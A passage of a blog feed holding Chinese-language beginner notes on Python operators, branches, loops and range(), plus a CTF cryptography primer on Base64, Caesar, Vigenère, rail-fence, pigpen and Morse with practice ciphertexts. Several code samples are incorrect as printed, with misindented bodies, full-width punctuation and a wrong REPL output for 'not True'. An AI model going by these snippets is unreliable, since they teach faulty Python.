data-original="https://img-blog.csdnimg.cn/20210404154125937.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>如果<strong>省略了开始位置</strong>  那么Python会从0开始。同样的，如果想得到从指定索引值到列表末尾的所有元素，省略<strong>结束位置</strong>  即可。<br>如果只有[：]的话，Python将返回整个列表的拷贝。</p><p><strong>tips：</strong><br>列表切片并不会修改列表自身的组成结构和数据，它其实是为列表创建一个新的拷贝 并返回。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python学习记录1</title>
      <link href="/2021/04/19/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/"/>
      <url>/2021/04/19/Python%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%951/</url>
      
        <content type="html"><![CDATA[<p>﻿# Python学习记录1</p><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p></font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><font color=#999AAA >记录在自学过程中对Python的记录，与 或 非 在Python中的应用；Python中的循环与分支;BIF及一些基础知识.</font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><p><font color=#999AAA >提示：以下是本篇文章正文内容，下面案例可供参考</p><h1 id="一、or-and-not"><a href="#一、or-and-not" class="headerlink" title="一、or and not"></a>一、or and not</h1><p><strong>and or not</strong> 都是一些逻辑操作符.在之前c语言的学习过程中遇到了很多次，只有当and操作符左右两边的操作符同时为True的时候 输出的结果才为True.<br>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="number">5</span> &gt; <span class="number">4</span> <span class="keyword">and</span>  <span class="number">4</span> &lt; <span class="number">1</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">&gt;&gt;&gt;<span class="number">5</span> &gt; <span class="number">4</span> <span class="keyword">and</span> <span class="number">4</span> &lt; <span class="number">7</span></span><br><span class="line"><span class="literal">True</span>  </span><br></pre></td></tr></table></figure><p>or 操作符和and不同，简单来说只要任意一边为真，结果就为真。 只有当两边同时为假时，才为假。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="number">77</span> &gt; <span class="number">55</span> <span class="keyword">or</span> <span class="number">5</span> &gt; <span class="number">999</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;<span class="number">111</span> &lt; <span class="number">2</span> <span class="keyword">or</span> <span class="number">7</span> &gt; <span class="number">99</span></span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><p>not操作符就很简单了，它是一个一元操作符，作用是得到一个和操作数相反的布尔类型的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">not</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">not</span></span><br><span class="line">&gt;&gt;&gt;<span class="keyword">not</span> <span class="number">0</span></span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>补充：布尔类型对象可以被赋予文字值true或者false，所对应的关系就是真与假的概念。<br>布尔类型（ bool）<br>布尔类型只有两个值，false 和 true。<br>通常用来判断条件是否成立。<br>如果变量值为 0 就是 false，否则为 true,布尔变量只有这两个值。<br>如：<br>　　例1：bool pb= -1.5; // pb=true;<br>　　例2：bool pt=0; // pt=false;<br>        例3：不同的关系运算符中的布尔类型值的结果<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210311192204670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p>另外在书上看的一个比较有趣的思考题：(not 1) or (0 and 1) or (3 and 4) or (5 and 6) or (7 and 8 and 9)的结果应该是多少？<br>个人理解：在这个例子中首先是逻辑判断的<strong>优先级问题，not  &gt;  and  &gt;  or</strong><br>                 然后是<strong>and 的短路逻辑</strong>。因为在and 中，<strong>两个为Ture才是真正的Ture</strong> .在 0 and 1 中 ，如果第一个值是0 也就是False ，系统会认为反正第二个值不管是什么都会返回一个 0 （False），在 3 and 4 中 ，第一个值是 3 也就是Ture，系统就会继续向下读值，也就会返回 4 了。<strong>然后是or 的短路逻辑。因为在or中，一个为Ture就是Ture了。</strong><br>   在(0)  or (0) or (4) or (6) or (9)中，<strong>首先遇到 0 ，0 是False ，接下来的值有可能是Ture，所以会继续向下读，当遇到 4 的时候，为Ture，系统就会停止判断，直接将为Ture的值返回。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="keyword">not</span> <span class="number">1</span>) <span class="keyword">or</span> (<span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span>) <span class="keyword">or</span> (<span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span>) <span class="keyword">or</span> (<span class="number">5</span> <span class="keyword">and</span> <span class="number">6</span>) <span class="keyword">or</span> (<span class="number">7</span> <span class="keyword">and</span> <span class="number">8</span> <span class="keyword">and</span> <span class="number">9</span>)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">0</span>)  <span class="keyword">or</span> (<span class="number">0</span>) <span class="keyword">or</span> (<span class="number">4</span>) <span class="keyword">or</span> (<span class="number">6</span>) <span class="keyword">or</span> (<span class="number">9</span>)</span><br><span class="line"><span class="number">4</span>      </span><br></pre></td></tr></table></figure><p>也可以这么理解：<br><strong>if a and b：#如果a是false，那么跳过b的判断，结果直接false<br>if a or b：#如果a为true，那么跳过b的判断，直接true</strong></p><p> or中至少有一个非0时，返回第一个非0数。<br> and中含0就返回0，若是均非0，则返回后面的值。</p><h1 id="二、缩进"><a href="#二、缩进" class="headerlink" title="二、缩进"></a>二、缩进</h1><p><strong>缩进</strong>可以说是Python的灵魂，因为缩进的严格要求才使得Python的代码显得非常精简，这也正是我想要学好Python的原因。但是在Python里对待代码的缩进要十分小心，因为如果没有正确地使用缩进，代码所做的事可能和我们的本意相差很大。</p><p>如果在正确的位置输入冒号(:),IDLE会在下一行自动进行缩进。在if和else语句后边加上冒号（:）,然后回车，第二行代码会自动进行缩进。if条件下面有两个语句都带有一个缩进，说明这两个语句是属于if条件成立后所执行的语句。也可以认为如果if条件不成立，那么两个缩进的语句都不会执行。<br>  if-else是一个条件分支，if后边跟的是条件，如果条件成立，就执行以下缩进的所有内容，如果条件不成立，有else的话就执行else下缩进的所有内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一个分数:  &#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">100</span> &gt;=score&gt;= <span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="number">90</span> &gt;=score&gt;= <span class="number">80</span>:</span><br><span class="line">    print(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="number">80</span> &gt;=score&gt;= <span class="number">60</span>:</span><br><span class="line">   print(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span> <span class="number">60</span> &gt;=score&gt;= <span class="number">0</span>:</span><br><span class="line">   print(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   print(<span class="string">&#x27;输入错误&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="三、BIF"><a href="#三、BIF" class="headerlink" title="三、BIF"></a>三、BIF</h2><p> BIF就是(built-in functions)内置函数<br> 目的：为了方便程序员快速的编写程序<br> dir(<strong>builtins</strong>)<br>print(dir(<strong>builtins</strong>))</p><p><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210311195146135.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>其中help()这个BIF用于显示BIF的功能描述：<img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/2021031119532283.png#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><h2 id="四、分支与循环"><a href="#四、分支与循环" class="headerlink" title="四、分支与循环"></a>四、分支与循环</h2><p>分支的概念：分支也就是在习惯使用的if条件判断，在条件持续保持成立或不成立的情况下，都执行固定的流程。<br>一旦条件发生改变，原来成立的条件就变为不成立，那么程序就走入另一条路了。</p><p>对于循环的概念我觉得可以这么理解  贪吃蛇大家都玩过 在你的蛇还没死的时候会不断的产生新的果子，只要你的蛇还没死 那么这个果子就会一直生成，也就是说只要不触发死亡机制，游戏就会一直在一个循环中执行。<br>可能分支就是<strong>只有符合条件，才会就执行命令。</strong><br>而循环是<strong>只要符合条件，就会一直执行这个命令。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一个分数:  &#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">100</span> &gt;=score&gt;= <span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">90</span> &gt;=score&gt;= <span class="number">80</span>:</span><br><span class="line">    print(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">80</span> &gt;=score&gt;= <span class="number">60</span>:</span><br><span class="line">   print(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">60</span> &gt;=score&gt;= <span class="number">0</span>:</span><br><span class="line">   print(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> score&lt; <span class="number">0</span> <span class="keyword">or</span> score&gt; <span class="number">100</span>:</span><br><span class="line">   print(<span class="string">&#x27;输入错误&#x27;</span>)</span><br></pre></td></tr></table></figure><p>上面对于成绩的分类划分其实就是一种分支和循环<br>但是这个并没有使用else</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入一个分数:  &#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">100</span> &gt;=score&gt;= <span class="number">90</span>:</span><br><span class="line">    print(<span class="string">&#x27;A&#x27;</span>) </span><br><span class="line"><span class="keyword">elif</span> <span class="number">90</span> &gt;=score&gt;= <span class="number">80</span>:</span><br><span class="line">    print(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &gt;=score&gt;= <span class="number">60</span>:</span><br><span class="line">   print(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">60</span> &gt;=score&gt;= <span class="number">0</span>:</span><br><span class="line">   print(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   print(<span class="string">&#x27;输入错误&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这是经过改良的代码 我们可以分析一下第一个代码，当我们输入成绩99分的时候，第一次判断即成立，接着会打印A，虽然已经有了答案，但是程序还不能立刻结束，还需要对后面的四个条件进行判断，知道后面的所有条件都不符合，才会结束程序。<br>然而在改良后的代码中，同样是输入99分的时候，第一次判断成立就可以退出程序并打印A。<br>这仅仅是一个很简单的代码 所以我们感觉差别不大，但可以试想一下 如果这是一个很大的程序 那么每判断一次就会消耗一个CPU时间，可想而知这其中的差距。</p><p>最近在看书的时候遇到一个<strong>避免“悬挂else”的问题</strong>学习之后觉得挺有用的 分享一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> age =<span class="number">20</span>;</span><br><span class="line"><span class="keyword">char</span> score=‘A’；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (age&lt;<span class="number">18</span>)</span><br><span class="line"><span class="keyword">if</span> (score ==<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;恭喜，一等奖。&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;很抱歉，本活动只限于18岁以下青少年参与&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这个作者的本意是 ：如果age不满足条件（age&lt;18），就执行else的内容。但是实际上程序并不会按照我们想的来执行，程序反而是会直接打印“恭喜，一等奖。”这个字符串。那与我们的本意差太多了</p><p>会这样的原因是因为<strong>对于很多语言来说if-else语法都会采用“就近匹配”的原则</strong>（可以直接记住就近原则哈哈哈）<br>所以上面代码的else应该是属于内存的if语句。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">age=<span class="number">20</span></span><br><span class="line">score =<span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> age&lt;<span class="number">18</span>:</span><br><span class="line">   <span class="keyword">if</span> score ==<span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;恭喜，一等奖.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">&quot;很抱歉，本活动只限于18岁以下青少年参与&quot;</span>)</span><br></pre></td></tr></table></figure><p>前面提到过缩进是Python的灵魂，也就是说因为缩进的严格使得Python代码显得精简，也可以认为就是让我们十分确定else是属于哪一个if，不存在c语言中模棱两可的情况。</p><p>可能这就是Python的魅力吧</p><h2 id="五、while-for-语句"><a href="#五、while-for-语句" class="headerlink" title="五、while for  语句"></a>五、while for  语句</h2><p><strong><em>1.</em></strong><br>while循环与if条件分支类似，区别就在 只要条件为真，while循环就会一直重复执行那一段代码，这段代码称为循环体。<br>我们就用1+2+3+….+100的计算结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">i =<span class="number">1</span></span><br><span class="line"><span class="built_in">sum</span> =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">100</span>:</span><br><span class="line"><span class="built_in">sum</span>+=i</span><br><span class="line"> i+=<span class="number">1</span></span><br><span class="line"> print(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>我们每次在设计循环体的时候都要考虑退出循环的条件，上面的代码中 每执行一次循环体的代码，变量i的值就会+1，这样的i会不断递增，知道i等于101的时候，条件不再成立，从而退出循环。<br>这里再补充一点别的知识<br><strong>a+=1 ⇔每次在a的本身上+1<br>a=+1⇔是给a赋值 +1</strong>  我手快当时打错 发现的小问题</p><p>接着上面的循环体来讲，如果缺少i+=1语句，循环将永远不会退出（<strong>除非你强制关掉</strong>）这也就是死循环。<br><strong><em>2.</em></strong><br>for循环语句的语法如下：<br>for 变量 in 可迭代对象：<br>循环体<br><strong>可迭代对象</strong>也就是指那些元素可以被单独提取出来的对象，如“Clearlove”（我最喜欢的选手啊啊哈哈）那么for循环语句每执行一次就会从这个字符串（<strong>可迭代对象</strong>）中拿出一个字符，然后存放到变量中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> <span class="string">&quot;Clearlove&quot;</span></span><br><span class="line"></span><br><span class="line">print(each)</span><br><span class="line">C</span><br><span class="line">l</span><br><span class="line">e</span><br><span class="line">a</span><br><span class="line">r</span><br><span class="line">l</span><br><span class="line">o</span><br><span class="line">v</span><br><span class="line">e</span><br></pre></td></tr></table></figure><p>但是如果想要用for循环来实现1+2+3+..+100的计算结果可不能像我下面这么写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">100</span>:</span><br><span class="line"><span class="built_in">sum</span> +=<span class="number">1</span></span><br><span class="line">print(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>这样是不可能正确的（因为我错了）<br>原因就在于<strong>100</strong>这是个<strong>整数</strong> 而不是<strong>可迭代对象</strong></p><p>如果非得用for语句 也不是不行<br>需要我们认识一个range（）<br>这是一个BIF函数，它的功能是为指定的整数生成一个<strong>数字序列</strong>（<strong>可迭代对象</strong>），语法如下：<br>range(stop）<br>range（start，stop）<br>range (start,stop,step)<br>range有三种用法，无论哪一种 参数必须是整数。</p><p>第一种用法是只有一个参数的情况，它会生成从0到该参数的数字序列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>（<span class="built_in">range</span>（<span class="number">7</span>））</span><br><span class="line">（<span class="number">0</span>，<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>，<span class="number">5</span>，<span class="number">6</span>）</span><br></pre></td></tr></table></figure><p>list是将可迭代对象以列表的形式展示出来。<br>第二种用法除了指定了结束数值，还指定了开始数值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>（<span class="built_in">range</span>(<span class="number">5</span>,<span class="number">10</span>））</span><br><span class="line">（<span class="number">5</span>，<span class="number">6</span>，<span class="number">7</span>，<span class="number">8</span>，<span class="number">9</span>）</span><br></pre></td></tr></table></figure><p>第三种用法是还可以指定步长，这个值默认为1，即生成的数字序列中，每个元素的间隔为1.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>,<span class="number">2</span>))</span><br><span class="line">(<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>）</span><br></pre></td></tr></table></figure><p>其实这个步长也可以是负整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>,-<span class="number">10</span>,-<span class="number">2</span>))</span><br><span class="line">(<span class="number">0</span>,-<span class="number">2</span>,-<span class="number">4</span>,-<span class="number">6</span>,-<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p>值得我们注意的是，生成的数字序列中，<strong>只包含了开始数值，并不包含结束数值。</strong><br>介绍完了range的用法 那么我们刚才的问题可以解决了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span> =<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line"><span class="built_in">sum</span> +=i</span><br><span class="line">print(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>range 可以说是for的好基友，在for语句中给了很大的帮助</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于python的学习自己还只是刚刚开始，python之路任重而道远。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF+密码学</title>
      <link href="/2021/03/28/CTF+%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2021/03/28/CTF+%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<ul><li>CTF</li><li>密码学<br>categories:  # 分类<br>thumbnail:  # 略缩图</li></ul><h1 id="CTF-密码学"><a href="#CTF-密码学" class="headerlink" title="CTF+密码学"></a>CTF+密码学</h1><p><font color=#999AAA >提示：前一段时间团队举行了内部赛，本来觉得密码学类的题应该是最简单的，但是当自己去做题的时候才发现，积累的并不是很多，并且这些东西记不在脑子里。所以打算写一篇文章来记录一下目前所遇到的密码学</p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p></font><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><font color=#999AAA >密码学个人感觉这是一个很容易掌握，但又不好搞得东西。容易掌握是因为这个东西没有门槛任何人都可以做，说它不好搞是因为涉及的东西太多太杂。有时候遇到了题目一时半会想不起来，需要足够的耐心和抗压能力</font></p><hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1"><h1 id="一、Base家族"><a href="#一、Base家族" class="headerlink" title="一、Base家族"></a>一、Base家族</h1><p>很常见的就是<strong>base64 base32 base16</strong>这三种了<br>通过结题的过程发现，<strong>一般看到“==”号的加密方式了，那不妨试试base64</strong><br>例如：<strong>bTByZSBpcyBwaWc=**解码之后为</strong>m0re is pig**<br>关于<strong>base32</strong><br>base32中只有<strong>大写字母（A-Z）和数字234567</strong><br><strong>base16</strong><br>base16中<strong>只有数字0-9以及大写字母ABCDEF</strong><br>但是除了这三个常见的，<strong>base家族还有其他的好兄弟</strong>  base58 base 91 等等，在网上都可以找到</p><h1 id="二、凯撒密码"><a href="#二、凯撒密码" class="headerlink" title="二、凯撒密码"></a>二、凯撒密码</h1><p><strong>凯撒密码作为一种最为古老的对称加密体制</strong>，在古罗马的时候都已经很流行，他的基本思想是：<strong>通过把字母移动一定的位数来实现加密和解密。</strong>明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，<strong>当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。</strong>由此可见，位数就是凯撒密码加密和解密的密钥。现今又叫“移位密码”，只不过移动的位数不一定是3位而已。<br>下面我们总结一下：<br>明密对照表：<br>明文：ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>密文：TUVWXYZABCDEFGHIJKLMNOPQRS<br>注：广义上的凯撒是位移的。<br>凯撒是没有密匙的，即使没有密匙也能将它破解出来，因为凯撒移位密码只有25种密匙，最多就是将这25种可能性挨个检测一下可以了，这就是我们所说的暴力破解法。<br> <strong>感兴趣的可以接一下我下面给的密文<br> p0uh ml mldq</strong></p><h2 id="三、维吉尼亚密码"><a href="#三、维吉尼亚密码" class="headerlink" title="三、维吉尼亚密码"></a>三、维吉尼亚密码</h2><p>维吉尼亚密码（又译维热纳尔密码）<strong>是使用一系列凯撒密码组成密码字母表的加密算法</strong>，属于多表密码的一种简单形式。<br>维吉尼亚密码引入了“<strong>密钥</strong>”的概念，即<strong>根据密钥来决定用哪一行的密表来进行替换</strong>，以此来对抗字频统计。<br><strong>e0cw tk rsj？</strong>  感兴趣的友友们可以试试噢 <strong>密钥是sl</strong></p><h2 id="四、栅栏密码"><a href="#四、栅栏密码" class="headerlink" title="四、栅栏密码"></a>四、栅栏密码</h2><p>所谓栅栏密码，<strong>就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。</strong>（一般不超过30个，也就是一、两句话）<br><strong>SoLdisgo</strong> 感兴趣的可以试试这个的原文是什么<br><strong>小tips</strong>：<br>当你可以在一串字符中看到flag{}就可以尝试使用栅栏密码比如felhaagv{ewtehtehfilnakgw}</p><h2 id="五、猪圈密码"><a href="#五、猪圈密码" class="headerlink" title="五、猪圈密码"></a>五、猪圈密码</h2><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），<strong>是一种以格子为基础的简单替代式密码。</strong>即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。<br>这里不多说了直接丢一个链接吧  里面还有好多的变形密码<br><a href="https://blog.csdn.net/weixin_47869330/article/details/111396033?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161676401516780357252918%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161676401516780357252918&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-111396033.first_rank_v2_pc_rank_v29_10&utm_term=%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81%E5%8F%98%E5%BD%A2">猪圈密码变形</a></p><h2 id="六、摩斯密码"><a href="#六、摩斯密码" class="headerlink" title="六、摩斯密码"></a>六、摩斯密码</h2><p>摩尔斯电码（英语：Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。是由美国人艾尔菲德·维尔（Alfred Lewis Vail）与萨缪尔·摩尔斯（Samuel Finley Breese Morse）在1836年发明。<br>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用0和1两种状态的二进制代码，它的代码包括五种：<br>1.点（.）</p><p>2.划（-）</p><p>3.每个字符间短的停顿（在点和划之间的停顿）</p><p>4.每个词之间中等的停顿</p><p>5.以及句子之间长的停顿<br><img "" class="lazyload placeholder" data-original="https://img-blog.csdnimg.cn/20210326211022197.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1b2R1MA==,size_16,color_FFFFFF,t_70#pic_center" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"><br>同样的下面编码可以试试<br>.-.. — …- . – —– .-. .</p><h2 id="七、ASCII编码"><a href="#七、ASCII编码" class="headerlink" title="七、ASCII编码"></a>七、ASCII编码</h2><p>ASCII ((American Standard Code for Information Interchange): 美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是最通用的信息交换标准，并等同于国际标准ISO/IEC 